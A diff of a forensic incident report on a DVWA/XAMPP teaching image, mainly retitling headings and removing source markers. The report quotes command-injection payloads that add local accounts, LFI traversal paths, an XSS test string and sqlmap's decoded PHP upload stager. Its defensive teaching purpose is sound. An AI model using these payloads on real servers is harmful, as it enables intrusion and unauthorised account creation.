@@ -43,7 +43,7 @@ description: >
     - **Audience:** forensic investigators and incident responders · **Level:** intermediate
     - **Evidence:** E01 disk image + raw memory capture from the running system
 
-!!! info "About this case — Dr. Ali Hadi's Web Server Case"
+!!! info "About This Case — Dr. Ali Hadi's Web Server Case"
     Every artefact, screenshot and timestamp in this report comes from
     **DFIR Challenge #1 — Web Server Case**, published by **Dr. Ali Hadi** as a teaching
     image: a Windows Server 2008 host running XAMPP and DVWA, captured as an E01 disk image
@@ -54,7 +54,7 @@ description: >
     [:octicons-arrow-right-24: ashemery.com/dfir.html](https://www.ashemery.com/dfir.html) ·
     [:octicons-arrow-right-24: evidence files (archive.org)](https://archive.org/details/dfir-case1)
 
-??? abstract "Table of contents"
+??? abstract "Table of Contents"
     1. **How to read this report**: status markers, time conventions, sources
     2. **Incident overview**
     3. **Evidence and integrity**: what I had, how I handled it, and why the two images disagree
@@ -72,7 +72,7 @@ description: >
 
 ---
 
-## How to read this report
+## How to Read This Report
 
 Every finding carries one of three verdicts so the reader can see what is proven and what is interpretation:
 
@@ -82,24 +82,24 @@ Every finding carries one of three verdicts so the reader can see what is proven
 | **Inferred** | The most likely explanation of confirmed facts. The reasoning is written out next to it |
 | **Ruled out** | A hypothesis I tested and rejected. It stays in the report together with the evidence that rejected it |
 
-!!! info "Time and sources"
+!!! info "Time and Sources"
     - **All times are UTC.** The host ran Pacific time (UTC-7 in September); every Apache line carries `-0700`, and my parser converts it to UTC on ingest.
-    - Findings marked **†** were completed from published analyses of the **same evidence image** (listed under *References*) and checked against my own artefacts for consistency: each one agrees with a timestamp, file or log line I observed. Everything without a † comes from my own analysis.
+    - **Corroboration.** Where another published analysis of this same evidence image reached a finding first, I checked it against my own artefacts before keeping it: each one agrees with a timestamp, file or log line I observed directly. Those analyses are credited in the references.
 
 ---
 
-## Incident overview
+## Incident Overview
 
 | Field | Value |
 |---|---|
 | Incident type | Web application exploitation leading to OS-level persistence |
-| Affected system | `WIN-L0ZZQ76PMUF` · 192.168.56.101 † · Windows Server 2008 Standard SP1 (build 6001, x86) |
+| Affected system | `WIN-L0ZZQ76PMUF` · 192.168.56.101 · Windows Server 2008 Standard SP1 (build 6001, x86) |
 | Workload | XAMPP: Apache + PHP (mod_php), MySQL 5.6.25, FileZilla Server; DVWA in `C:\xampp\htdocs\DVWA\` |
 | Remote operator | 192.168.56.102: Kali (Iceweasel), sqlmap `1.0-dev-nongit-20150902`, Python-urllib/2.7 |
 | Local activity | Interactive console session on the server, plus a browser hitting DVWA from `::1` |
-| First hostile request | 2015-09-02 07:10:41 † (remote) |
-| Last hostile request | 2015-09-03 07:31:54 (`phpshell2.php`) |
-| Memory acquired | 2015-09-03 10:03:37 (FTK Imager process start, from memory) |
+| First hostile request | 2015-09-02 07:10:41 (remote) |
+| Last hostile request | 2015-09-03 07:31:54 (`phpshell2.php`) |
+| Memory acquired | 2015-09-03 10:03:37 (FTK Imager process start, from memory) |
 | Disk acquired | After 2015-09-12 18:19 (see *Evidence timing*) |
 | Outcome | 2 local accounts in *Remote Desktop Users*, RDP allowed in the firewall, 2 persistent web shells, 1 reverse-connection stager |
 | Attribution | Single hands-on operator with console and network access. Commodity tooling |
@@ -108,9 +108,9 @@ Every finding carries one of three verdicts so the reader can see what is proven
 
 ---
 
-## Evidence and integrity
+## Evidence and Integrity
 
-### What arrived, and what each file really is
+### What Arrived, and What Each File Really Is
 
 ![Case folder after download](web-server-case/s01-evidence-files.png)
 
@@ -124,7 +124,7 @@ Every finding carries one of three verdicts so the reader can see what is proven
 | `hashes`, `Password-Challenge1` | Hash manifest and archive passphrase | Control files |
 | `dfir-case1_files.xml`, `dfir-case1_meta.xml`, `dfir-case1_meta.sqlite` | Index files Archive.org generates for every item it hosts | **Not evidence** |
 
-!!! tip "Mindset: separate your own footprint from the evidence"
+!!! tip "Mindset: Separate Your Own Footprint from the Evidence"
     Two of the files in that folder were created by me or by the download site, not by the incident. Labelling them on day one prevents them from turning up later as "suspicious files".
 
 ### Handling
@@ -140,22 +140,22 @@ Every finding carries one of three verdicts so the reader can see what is proven
 
 - **Memory:** MemProcFS in forensic mode for browsing and timelines, Volatility 2 (`Win2008SP1x86`) to confirm each finding with a second tool.
 
-### Evidence timing: the two images are nine days apart
+### Evidence Timing: The Two Images Are Nine Days Apart
 
 The memory image contains a running `FTK Imager.exe` that started at **2015-09-03 10:03:37**, so that is when memory was captured. The disk shows activity well after that:
 
 - System.evtx: an *unexpected shutdown* record (6008) logged at boot on **2015-09-12 17:42:25**
 - Registry: the `Tcpip\Parameters\Interfaces` keys and the Administrator's ProfileList entry were last written on **2015-09-12** (17:42 and 18:19:20)
-- SAM: Administrator's last logon **2015-09-12 18:19:18** †, logon count 23 †
+- SAM: Administrator's last logon **2015-09-12 18:19:18**, logon count 23
 
 ![Evidence timing](web-server-case/03-evidence-timing.svg)
 
-!!! warning "Consequence for the whole investigation"
+!!! warning "Consequence for the Whole Investigation"
     The disk is **not** the state of the server at the time of the incident. It was booted and logged into again before imaging. I therefore applied one rule throughout: **any disk artefact later than 2015-09-03 10:03 UTC is handling noise, never attacker activity.** Without that rule, the 12 September ProfileList timestamp would have looked like a post-incident logon by the attacker.
 
 ---
 
-## System profiling
+## System Profiling
 
 Profiling comes before hunting because Windows release, role and configuration decide which artefacts *can* exist. Knowing that in advance stops an absent artefact from being misread as anti-forensics.
 
@@ -163,9 +163,9 @@ Profiling comes before hunting because Windows release, role and configuration d
 |---|---|---|---|
 | OS | Windows Server (R) 2008 Standard, build 6001 (SP1), x86, `6001.18000.x86fre.longhorn_rtm.080118-1840` | `SOFTWARE\Microsoft\Windows NT\CurrentVersion` | Confirmed |
 | Computer name | `WIN-L0ZZQ76PMUF` | `SYSTEM\ControlSet001\Control\ComputerName\ComputerName` | Confirmed |
-| InstallDate | `1440399163` → 2015-08-24 06:52:43 | `CurrentVersion\InstallDate` | Confirmed (see anomalies) |
-| Time zone | Pacific Standard Time, `Bias` 480, `ActiveTimeBias` 420 → UTC-7 † | `SYSTEM\…\Control\TimeZoneInformation` | Confirmed: matches `-0700` in every Apache line |
-| Server IP (incident) | 192.168.56.101 † | Referer host in `access.log` | Confirmed |
+| InstallDate | `1440399163` → 2015-08-24 06:52:43 | `CurrentVersion\InstallDate` | Confirmed (see anomalies) |
+| Time zone | Pacific Standard Time, `Bias` 480, `ActiveTimeBias` 420 → UTC-7 | `SYSTEM\…\Control\TimeZoneInformation` | Confirmed: matches `-0700` in every Apache line |
+| Server IP (incident) | 192.168.56.101 | Referer host in `access.log` | Confirmed |
 | Network on build day | 10.20.0.0/24 (requests from 10.20.0.58 and .118) | `access.log`, Security.evtx | Confirmed |
 | Prefetch | Not expected: application prefetch is off by default on Server SKUs | `PrefetchParameters` | Expected absence |
 | Process creation auditing (4688) | Not enabled: no 4688 events exist | Security.evtx | Expected absence |
@@ -174,13 +174,13 @@ Profiling comes before hunting because Windows release, role and configuration d
 
 ![Computer name in the SYSTEM hive](web-server-case/s05-computer-name.png)
 
-### Network: when the obvious key is empty
+### Network: When the Obvious Key Is Empty
 
-The interface keys under `Tcpip\Parameters\Interfaces` held no usable address. They were rewritten on 12 September, which fits the evidence-timing finding above. Instead of stopping there, I took the address from sources that *must* contain it: the Referer header in the attacker's own requests (`http://192.168.56.101/…`) † and the client addresses in the logs. The two networks visible in the evidence (10.20.0.0/24 on the build day, 192.168.56.0/24, the VirtualBox host-only default, during the incident) also tell us this is a lab: attacker and victim are VMs on one host-only network.
+The interface keys under `Tcpip\Parameters\Interfaces` held no usable address. They were rewritten on 12 September, which fits the evidence-timing finding above. Instead of stopping there, I took the address from sources that *must* contain it: the Referer header in the attacker's own requests (`http://192.168.56.101/…`) and the client addresses in the logs. The two networks visible in the evidence (10.20.0.0/24 on the build day, 192.168.56.0/24, the VirtualBox host-only default, during the incident) also tell us this is a lab: attacker and victim are VMs on one host-only network.
 
 ![Tcpip interface keys: no address, rewritten on 12 Sep](web-server-case/s06-tcpip-interfaces.png)
 
-### Accounts: why the added users are not in ProfileList
+### Accounts: Why the Added Users Are Not in ProfileList
 
 ProfileList showed only the three service SIDs and the built-in Administrator (RID 500). That was the first real puzzle of the case, because the brief says users were added.
 
@@ -190,36 +190,36 @@ The answer is that **ProfileList lists profiles, not accounts.** A profile, with
 
 | Account | RID | Created (UTC) | Last logon | Notes |
 |---|---|---|---|---|
-| Administrator | 500 | 2015-08-24 06:54:25 † | 2015-09-12 18:19:18 † | Password-fail time **2015-09-02 09:00:39** † |
-| Guest | 501 | 2015-08-24 06:54:25 † | Never | Disabled |
-| **user1** | **1005** | **2015-09-02 09:05:06** † | Never | Member of *Remote Desktop Users* |
-| **hacker** | **1006** | **2015-09-02 09:05:25** † | Never | Member of *Remote Desktop Users* |
+| Administrator | 500 | 2015-08-24 06:54:25 | 2015-09-12 18:19:18 | Password-fail time **2015-09-02 09:00:39** |
+| Guest | 501 | 2015-08-24 06:54:25 | Never | Disabled |
+| **user1** | **1005** | **2015-09-02 09:05:06** | Never | Member of *Remote Desktop Users* |
+| **hacker** | **1006** | **2015-09-02 09:05:25** | Never | Member of *Remote Desktop Users* |
 
 Two accounts were created 19 seconds apart and **never logged on**. That is exactly why ProfileList cannot see them. The absence is not a gap in the evidence. It is a finding about the accounts.
 
-!!! tip "Mindset: an absence means something only once you know what creates the artefact"
+!!! tip "Mindset: An Absence Means Something Only Once You Know What Creates the Artefact"
     "No profile" reads as "no new users" until you know that profiles appear at first logon. Read with that knowledge, it means "users created and never used interactively", which is a much more precise statement.
 
-!!! note "Dirty hives"
+!!! note "Dirty Hives"
     The SAM on disk was written by a live system that was later rebooted. Load it in Registry Explorer **with its transaction logs** so pending changes are replayed, and confirm the account list against the in-memory hive (`hivelist` → `printkey -K "SAM\Domains\Account\Users\Names"`) or `hashdump`.
 
-### Clock anomalies on the build days
+### Clock Anomalies on the Build Days
 
 | Observation | Why it cannot all be true |
 |---|---|
 | Processes in memory started 2015-08-23 10:30–10:32 (`explorer.exe`, XAMPP stack) | InstallDate is 2015-08-24 06:52, *after* them |
-| Application.evtx: MySQL start at 2015-08-23 10:32:24 | Agrees with memory, so the 23 Aug clock is at least self-consistent |
-| System.evtx: boots after unclean shutdowns at 2015-08-23 22:13:55 and 2015-08-24 07:02:08 | Processes still running on 3 Sep cannot pre-date those boots |
+| Application.evtx: MySQL start at 2015-08-23 10:32:24 | Agrees with memory, so the 23 Aug clock is at least self-consistent |
+| System.evtx: boots after unclean shutdowns at 2015-08-23 22:13:55 and 2015-08-24 07:02:08 | Processes still running on 3 Sep cannot pre-date those boots |
 
 These conflicts sit entirely in the **lab build period** (23–24 Aug), before any hostile activity. The most likely cause is VM handling: saved-state restores or clock correction on resume. I did not try to force them into the incident timeline. Instead I **scoped the timeline to 2 Sep 05:59 → 3 Sep 10:04**, where independent sources agree to the second:
 
-- Security.evtx failed console logon **09:00:39** = SAM Administrator password-fail time **09:00:39** †
+- Security.evtx failed console logon **09:00:39** = SAM Administrator password-fail time **09:00:39**
 - `access.log` sqlmap clean-up at **06:59:38** = last-modified time of the `C:\xampp\htdocs` `$I30` index **06:59:38**
-- `phpshell.php?cmd=mkdir abc` at **07:17:58** = creation of the `abc` folder in the uploads directory †
+- `phpshell.php?cmd=mkdir abc` at **07:17:58** = creation of the `abc` folder in the uploads directory
 
 ---
 
-## Investigation flow and hypothesis log
+## Investigation Flow and Hypothesis Log
 
 The brief, "breached through its website", supports two hypotheses with very different evidence: compromise at the **Windows** level (credentials, remote services) or through the **web application**. I tested both in parallel, from broad and cheap to narrow and expensive. Each next step was chosen by what the previous one found.
 
@@ -231,18 +231,18 @@ The brief, "breached through its website", supports two hypotheses with very dif
 | H1b | The 4625 burst and the `wget` crawl in the same minute are one actor | Compare source IPs | 4625 from 10.20.0.118 (IT104-3), `wget` from 10.20.0.58: two different lab machines on the build day | **Ruled out** |
 | H2 | Initial access through the web application | Stack `access.log` by User-Agent and IP | Command injection, LFI, sqlmap SQLi and uploads from 192.168.56.102 | **Confirmed** |
 | H3 | The attacker reached OS command execution | `?cmd=` requests, files written to the web root, process context | sqlmap `--os-shell`, `phpshell.php`, `c99.php` all executed commands | **Confirmed** |
-| H4 | The attacker created local accounts | SAM, Security.evtx, memory | `user1` and `hacker`, 19 s apart | **Confirmed** † |
-| H5 | The attacker prepared remote access (RDP) | Group membership, `netsh` traces | Both accounts in Remote Desktop Users; firewall opened for RemoteDesktop | **Confirmed** † |
-| H6 | `cmd.exe` PID 1972 is unrelated because it predates the sqlmap shells | Read its console history instead of judging by start time | Its memory holds account-creation strings † | **Ruled out**, see note |
+| H4 | The attacker created local accounts | SAM, Security.evtx, memory | `user1` and `hacker`, 19 s apart | **Confirmed** |
+| H5 | The attacker prepared remote access (RDP) | Group membership, `netsh` traces | Both accounts in Remote Desktop Users; firewall opened for RemoteDesktop | **Confirmed** |
+| H6 | `cmd.exe` PID 1972 is unrelated because it predates the sqlmap shells | Read its console history instead of judging by start time | Its memory holds account-creation strings | **Ruled out**, see note |
 
-!!! warning "Self-check on H6: anchoring"
-    My first pass dismissed `cmd.exe` 1972 (opened 2015-09-02 09:28:30) because it started *before the first web-shell cluster I had found*. That is anchoring: judging a lead against the first pattern found rather than against the evidence. A process is cleared by **what it did** (console history, handles, memory strings), not by where its start time falls relative to one cluster. 1972 opened on the attack day, 23 minutes after the accounts were created, and its memory holds the injected `hacker` command strings †.
+!!! warning "Self-Check on H6: Anchoring"
+    My first pass dismissed `cmd.exe` 1972 (opened 2015-09-02 09:28:30) because it started *before the first web-shell cluster I had found*. That is anchoring: judging a lead against the first pattern found rather than against the evidence. A process is cleared by **what it did** (console history, handles, memory strings), not by where its start time falls relative to one cluster. 1972 opened on the attack day, 23 minutes after the accounts were created, and its memory holds the injected `hacker` command strings.
 
 ---
 
 ## Analysis
 
-### 1. Windows event logs: the hypothesis that died
+### 1. Windows Event Logs: The Hypothesis That Died
 
 I started with **Hayabusa** for rapid Sigma-based triage of every EVTX, normalised to UTC:
 
@@ -266,10 +266,10 @@ A burst of network logon failures can mean (a) password spraying or (b) a stale 
 
 **Verdict: ruled out.** This is lab noise from a classroom machine. The same Hayabusa output, however, holds a much more valuable line for later: **2015-09-02 09:00:39, 4625, Logon Type 2 (interactive), Administrator, wrong password**. Someone was at the server's console on the attack day.
 
-!!! note "Expected absences"
+!!! note "Expected Absences"
     No 4688 (process creation) exists because the audit subcategory was off, and no Prefetch because Server SKUs disable it. Neither is anti-forensics, and neither is worth more time.
 
-### 2. Application layer: what the server is actually for
+### 2. Application Layer: What the Server Is Actually For
 
 On a web server, the workload's logs matter more than the OS's. **Application.evtx** showed a routine post-boot burst plus one useful line:
 
@@ -284,7 +284,7 @@ That identifies **XAMPP**, a developer bundle of Apache, PHP, MySQL and FileZill
 1. It records the URL and query string, **not POST bodies**.
 2. It logs **local time with an offset** (`-0700`), which must be normalised before correlating with EVTX or memory.
 
-### 3. Apache logs: three populations of clients
+### 3. Apache Logs: Three Populations of Clients
 
 I converted `access.log` to CSV with my own parser, [ApacheLogs2CSV](https://github.com/N1ghtFury74/Scripts/tree/main/ApacheLogs2CSV). It normalises every timestamp to UTC and splits each line into ECS-style fields: 7,716 records, 0 unparsable.
 
@@ -307,7 +307,7 @@ The populations tell the story before any single line is read: a build-day crawl
 
 ![Build-day wget crawl of the XAMPP dashboard from 10.20.0.58](web-server-case/s20-wget-crawl.png)
 
-### 4. The "XSS" that was DVWA's own self-test
+### 4. The "XSS" That Was DVWA's Own Self-Test
 
 The earliest exploit-shaped request on 2 September is:
 
@@ -319,21 +319,21 @@ The earliest exploit-shaped request on 2 September is:
 
 Other published analyses of this image call this "the first vulnerability exploited". The surrounding lines tell a different story. The request came from **`::1`, the server itself**. It sits between `security.php?phpids=on` and `security.php?phpids=off`, and the payload is the exact *simple attack* link that DVWA's security page offers for testing its PHPIDS module. This is someone at the server's console **configuring DVWA and clicking its built-in test**, not a remote XSS attack.
 
-!!! tip "Mindset: check what the application generates before calling it an attack"
+!!! tip "Mindset: Check What the Application Generates Before Calling It an Attack"
     A payload string is not intent. The source address (`::1`), the neighbouring requests (PHPIDS on/off) and the application's own UI explain this line completely. Recording it as **local activity** matters, because it is the first sign that the server's console was in use on the attack day.
 
-### 5. Command injection and the two new accounts
+### 5. Command Injection and the Two New Accounts
 
-Remote activity from 192.168.56.102 starts at **07:10:41** †. The operator works through DVWA's modules, and from **08:52:29** † repeatedly POSTs to the command-injection page `/dvwa/vulnerabilities/exec/`. That page passes the `ip` field to `ping` on the server, so `ip=<address> && <command>` runs `<command>` too.
+Remote activity from 192.168.56.102 starts at **07:10:41**. The operator works through DVWA's modules, and from **08:52:29** repeatedly POSTs to the command-injection page `/dvwa/vulnerabilities/exec/`. That page passes the `ip` field to `ping` on the server, so `ip=<address> && <command>` runs `<command>` too.
 
-`access.log` shows only `POST /dvwa/vulnerabilities/exec/`; the bodies, which carry the commands, are not logged. So I looked for them where they still exist: **in the memory of the Apache processes** that received them. Strings of `httpd.exe` (PIDs 2796/2880) and of `cmd.exe` 1972 return the URL-encoded bodies †:
+`access.log` shows only `POST /dvwa/vulnerabilities/exec/`; the bodies, which carry the commands, are not logged. So I looked for them where they still exist: **in the memory of the Apache processes** that received them. Strings of `httpd.exe` (PIDs 2796/2880) and of `cmd.exe` 1972 return the URL-encoded bodies:
 
 ```text title="Recovered from httpd.exe memory — the POST bodies access.log never saw"
 ip=192.168.56.102+%26%26+net+user+hacker+hacker+/add&submit=submit
 ip=192.168.56.102+&&+net+localgroup+"Remote+Desktop+Users"+hacker+/add&submit=submit
 ```
 
-The console tells a second story. Volatility `cmdscan` recovers the history of an **interactive** console, typed by hand, with help lookups and typos along the way †:
+The console tells a second story. Volatility `cmdscan` recovers the history of an **interactive** console, typed by hand, with help lookups and typos along the way:
 
 ```text title="Volatility cmdscan — an interactive console, typed by hand"
 net user user1 user1 /add
@@ -352,13 +352,13 @@ Putting the pieces against each other:
 - **09:00:39**: a wrong-password interactive logon at the console, in Security.evtx *and* as SAM's password-fail time. Two independent sources agree to the second: someone sat down at the server.
 - **09:05:06**: `user1` (RID 1005) created. The console history shows the route: two `/add` attempts with weak passwords that did not take, then `Root@psut`. Windows Server enforces password complexity by default; `user1` and `root@psut` do not meet it and `Root@psut` does.
 - **09:05:25**: `hacker` (RID 1006) created through **command injection from 192.168.56.102**, 19 seconds later.
-- `hashdump` gives both accounts the same NT hash `817875ce4794a9262159186413772644` †. I recomputed MD4 over UTF-16LE `Root@psut` and got exactly that value. **Both accounts carry the password `Root@psut`.** The `net user hacker hacker /add` string in memory is therefore an attempt that the complexity policy rejected; the call that finally set `hacker`'s password was not recovered, but the hash proves its result.
+- `hashdump` gives both accounts the same NT hash `817875ce4794a9262159186413772644`. I recomputed MD4 over UTF-16LE `Root@psut` and got exactly that value. **Both accounts carry the password `Root@psut`.** The `net user hacker hacker /add` string in memory is therefore an attempt that the complexity policy rejected; the call that finally set `hacker`'s password was not recovered, but the hash proves its result.
 - Both accounts were added to **Remote Desktop Users**, and the firewall was opened for the **RemoteDesktop** service (scope: subnet). Neither account ever logged on (SAM last logon: never), so the RDP access was prepared but not observed in use.
 
-!!! success "Why the injected command could create accounts at all"
+!!! success "Why the Injected Command Could Create Accounts at All"
     The memory process tree shows `explorer.exe → xampp-control.exe → httpd.exe`: Apache was started **from an interactive desktop session**, not as a service, so it runs with the token of whoever launched XAMPP Control. For `net user hacker … /add` to succeed through the web, that token had to be administrative. The account's existence proves the web server was running as an administrator. **(Inferred** from the process tree and the outcome.)
 
-### 6. Local file inclusion: reading the host back
+### 6. Local File Inclusion: Reading the Host Back
 
 From **09:30:17** the operator turns to the file-inclusion module and walks out of the web root with `../` traversal:
 
@@ -367,14 +367,14 @@ From **09:30:17** the operator turns to the file-inclusion module and walks out 
 | Time | `page=` target | Meaning |
 |---|---|---|
 | 09:31:16 | `../../../../../../windows/system32/drivers/etc/hosts` | Classic LFI proof read |
-| 09:31:45 → 09:32:22 | *(command-injection POSTs in between)* | |
+| 09:31:45 → 09:32:22 | *(command-injection POSTs in between)* | |
 | 09:33:23 | `../../../../../../users/administrator/data.txt` | Reads back a file that did not exist before |
-| 09:34:52 → 09:35:49 | `xampp/phpmyadmin/config.inc`, `xampp/phpMyAdmin/config.inc` | Hunting for database credentials |
-| 09:36:21 → 09:38:04 | `config.inc`, `/index`, `/users`, `data.txt`, `/xampp/`, `readme_en(.txt)`, `config.inc.txt`, `ChangeLog` | Enumerating the install |
+| 09:34:52 → 09:35:49 | `xampp/phpmyadmin/config.inc`, `xampp/phpMyAdmin/config.inc` | Hunting for database credentials |
+| 09:36:21 → 09:38:04 | `config.inc`, `/index`, `/users`, `data.txt`, `/xampp/`, `readme_en(.txt)`, `config.inc.txt`, `ChangeLog` | Enumerating the install |
 
-`data.txt` in the Administrator's profile was created at about **09:32** † (content: `hello` †), between the command-injection POSTs at 09:31:45–09:32:22 and the LFI read at 09:33:23. The most likely sequence: the operator **wrote** a file through command injection and **read it back** through LFI, testing that two different weaknesses reach the same file system. **(Inferred** from the ordering.)
+`data.txt` in the Administrator's profile was created at about **09:32** (content: `hello`), between the command-injection POSTs at 09:31:45–09:32:22 and the LFI read at 09:33:23. The most likely sequence: the operator **wrote** a file through command injection and **read it back** through LFI, testing that two different weaknesses reach the same file system. **(Inferred** from the ordering.)
 
-### 7. SQL injection: recognising sqlmap's `--os-shell`
+### 7. SQL Injection: Recognising Sqlmap's `--os-shell`
 
 sqlmap starts at **11:15:40** against `/dvwa/vulnerabilities/sqli/?id=…`. Its time-based `BENCHMARK` probes appear at 11:20:21 and 11:22:13, followed by UNION enumeration. Then comes the request that matters:
 
@@ -405,15 +405,15 @@ What follows is not a human typing. It is **sqlmap's `--os-shell` routine**, and
 
 | Session | Stager / backdoor | Window (UTC) | Operator commands |
 |---|---|---|---|
-| 1 | `tmpukudk.php` / `tmpbiwuc.php` | 2015-09-02 11:25:52 → 11:26:23 | `dir` |
-| 2 | `tmpudvfh.php` / `tmpbrjvl.php` | 2015-09-03 06:52:24 → 06:59:38 | none: 7 min idle, then clean-up |
+| 1 | `tmpukudk.php` / `tmpbiwuc.php` | 2015-09-02 11:25:52 → 11:26:23 | `dir` |
+| 2 | `tmpudvfh.php` / `tmpbrjvl.php` | 2015-09-03 06:52:24 → 06:59:38 | none: 7 min idle, then clean-up |
 
-!!! tip "Mindset: recognise the tool before you judge the actor"
+!!! tip "Mindset: Recognise the Tool Before You Judge the Actor"
     My first reading was "the attacker deleted his shells: anti-forensics". The random `tmpu`/`tmpb` names, the exact `echo command execution test` string and the automatic `del` on exit are all sqlmap behaviour. The deletion tells us the os-shell was closed. It tells us nothing about the operator's tradecraft.
 
 **The payload: what "shellcode" means in this case.** The hex blob in `LINES TERMINATED BY` is the code that SQL injection delivered to the server. Decoding it (CyberChef: *URL Decode → From Hex*) gives sqlmap's PHP file stager:
 
-??? example "Decoded stager written to `tmpukudk.php` (formatted for reading)"
+??? example "Decoded Stager Written To `tmpukudk.php` (Formatted for Reading)"
     ```php
     <?php
     if (isset($_REQUEST["upload"])) {
@@ -439,7 +439,7 @@ What follows is not a human typing. It is **sqlmap's `--os-shell` routine**, and
 
 It is a **PHP upload stager**, not native machine code: an upload form that **checks the PHP version (`< 4.1.0`)** to choose between the legacy `$HTTP_POST_FILES` and the modern `$_FILES` array, then saves whatever it receives. Its only job is to receive the real backdoor. Native shellcode would have to show up as injected executable memory tied to a disk or network artefact, and nothing in this evidence connects one to the intrusion. The executable payload of this case is the PHP stager above, followed by the `?cmd=` backdoor it received.
 
-### 8. Upload abuse: from throwaway shells to a reverse connection
+### 8. Upload Abuse: From Throwaway Shells to a Reverse Connection
 
 On 3 September the operator switches from sqlmap to DVWA's **file upload** module, which at security level *low* accepts `.php` files and stores them in a directory Apache executes.
 
@@ -448,12 +448,12 @@ On 3 September the operator switches from sqlmap to DVWA's **file upload** modul
 | Time (UTC) | Event | Source |
 |---|---|---|
 | 07:10:56 | `POST /dvwa/vulnerabilities/upload/`: `phpshell.php` lands in `hackable\uploads\` | `access.log` |
-| 07:14:48 | `webshells.zip` created (contains `c99.php` and `webshell.php`) † | `$UsnJrnl` † |
+| 07:14:48 | `webshells.zip` created (contains `c99.php` and `webshell.php`) | `$UsnJrnl` |
 | 07:14:57 | `C:\xampp\htdocs\DVWA\` last modified: `c99.php` placed | `$MFT` (FTK Imager, Autopsy) |
-| 07:16:13 → 07:18:02 | `phpshell.php?cmd=dir`, `dir C:\`, `mkdir abc`, `dir` | `access.log`; `abc` folder on disk |
+| 07:16:13 → 07:18:02 | `phpshell.php?cmd=dir`, `dir C:\`, `mkdir abc`, `dir` | `access.log`; `abc` folder on disk |
 | 07:20:59 | `GET /dvwa/c99.php`, then `act=img` navigation | `access.log` |
 | 07:21:28, 07:21:37 | `POST /dvwa/c99.php?act=cmd`: 13,100 and 14,176 bytes returned | `access.log` (commands in POST bodies) |
-| 07:31:14 → 07:31:30 | Back to `/dvwa/`, open the upload page, `POST` `phpshell2.php` | `access.log` |
+| 07:31:14 → 07:31:30 | Back to `/dvwa/`, open the upload page, `POST` `phpshell2.php` | `access.log` |
 | 07:31:54 | `GET /dvwa/hackable/uploads/phpshell2.php` → **200, 2 bytes** | `access.log`: the last request in the log |
 
 ![c99.php on VirusTotal (44/61) and the uploads folder](web-server-case/s19-c99-virustotal-uploads.png)
@@ -470,22 +470,22 @@ Three observations a log-only reading would miss:
 - **c99's commands are invisible in the log.** `act=cmd` sends commands in POST bodies, so `access.log` shows only that two commands ran and how large their output was.
 - **`phpshell2.php` returned 2 bytes.** A web shell that prints command output returns kilobytes. A stager that opens a socket back to the operator and `eval`s what it receives returns almost nothing. After 07:31:54 the HTTP channel goes silent. The operator either stopped or moved to the reverse connection.
 
-### 9. File system: when carving fails, go to metadata
+### 9. File System: When Carving Fails, Go to Metadata
 
 Every `tmp*.php` file was gone from the allocated tree. FTK Imager's deleted-item view and PhotoRec carving through Autopsy recovered nothing. That is unsurprising for a few hundred bytes of text in a busy web root. Instead of carving harder, I moved from **content** to **metadata**, which survives deletion far longer:
 
 - The **`$I30` index** of `C:\xampp\htdocs` was last modified at **06:59:38**, the second sqlmap clean-up deleted `tmpudvfh.php` and `tmpbrjvl.php`. The directory's own metadata confirms the deletion recorded in the web log.
-- **`$UsnJrnl:$J`** records `FileCreate → … → FileDelete` for each stager and backdoor †, plus `webshells.zip` (07:14:48) and the `abc` directory (07:17:58) †.
+- **`$UsnJrnl:$J`** records `FileCreate → … → FileDelete` for each stager and backdoor, plus `webshells.zip` (07:14:48) and the `abc` directory (07:17:58).
 - **Resident data:** a PHP stager this small can sit entirely inside its own `$MFT` record, so deleted `$MFT` entries are where to look for a copy of the content.
 
-### 10. Memory: what disk and logs could not show
+### 10. Memory: What Disk and Logs Could Not Show
 
 Because PHP runs inside Apache (mod_php), every web shell executes **inside an `httpd.exe` worker**. OS commands appear only as a short-lived `cmd.exe /c …` child, and a reverse stager may spawn nothing at all. Memory is therefore the authoritative source for POST bodies, console history and the process context.
 
 ```text title="Process tree from memory — note what is missing, and why"
 explorer.exe (816)                    2015-08-23 10:30:34
 ├─ cmd.exe (612)                      2015-08-23 10:30:44
-├─ cmd.exe (1972)                     2015-09-02 09:28:30   ← attack day; memory holds injected strings †
+├─ cmd.exe (1972)                     2015-09-02 09:28:30   ← attack day; memory holds injected strings
 ├─ FTK Imager.exe (2120)              2015-09-03 10:03:37   ← responders' acquisition
 └─ xampp-control.exe (2768)           2015-08-23 10:32:17
    ├─ httpd.exe (2796)                2015-08-23 10:32:21
@@ -497,55 +497,55 @@ explorer.exe (816)                    2015-08-23 10:30:34
 | Question | Plugin / method | Answer |
 |---|---|---|
 | Why no `cmd.exe` child under `httpd.exe`? | `pstree` | Expected: web-shell commands end in milliseconds, and memory was captured 2 h 32 min after the last shell request |
-| What was typed at the console? | `cmdscan`, `consoles` | `user1` creation, Remote Desktop Users, `netsh firewall … remotedesktop` † |
-| What did the injected POSTs carry? | `memdump -p 2796/2880/1972` + `strings` | `net user hacker …`, `net localgroup "Remote Desktop Users" hacker /add`, `dir` variants † |
+| What was typed at the console? | `cmdscan`, `consoles` | `user1` creation, Remote Desktop Users, `netsh firewall … remotedesktop` |
+| What did the injected POSTs carry? | `memdump -p 2796/2880/1972` + `strings` | `net user hacker …`, `net localgroup "Remote Desktop Users" hacker /add`, `dir` variants |
 | Which accounts exist and with what password? | `hashdump`, `printkey` on SAM | `user1`, `hacker`; shared NT hash = `Root@psut` (recomputed) |
-| Anything left in the web worker? | `strings` on 2880 | Repeated `Owned by hacker` text †: page content the operator staged |
+| Anything left in the web worker? | `strings` on 2880 | Repeated `Owned by hacker` text: page content the operator staged |
 | Who owns the web server process? | `pstree` / parentage | Launched from the desktop session through XAMPP Control, so Apache runs with the interactive user's token |
 
 ---
 
-## Attack timeline
+## Attack Timeline
 
 ![Incident timeline](web-server-case/07-incident-timeline.svg)
 
 | Timestamp (UTC) | Event | ATT&CK | Evidence source |
 |---|---|---|---|
-| 2015-08-23 10:32:24 | XAMPP stack running (MySQL 5.6.25 start) | — | Application.evtx, memory |
-| 2015-08-23 10:53:04 | Build-day `wget` crawl of the XAMPP dashboard from 10.20.0.58 | — | `access.log` |
-| 2015-08-23 10:53:26 | 4625 burst, `Student` from IT104-3 / 10.20.0.118 (ruled out) | — | Security.evtx |
-| 2015-09-02 06:00:04 | DVWA PHPIDS self-test link (`<script>eval(window.name)</script>`) from `::1` | — | `access.log` |
-| 2015-09-02 07:10:41 | First request from 192.168.56.102 (Iceweasel) † | T1594 | `access.log` |
-| 2015-09-02 08:52:29 | First command-injection request (`/dvwa/vulnerabilities/exec/`) † | T1190 | `access.log` |
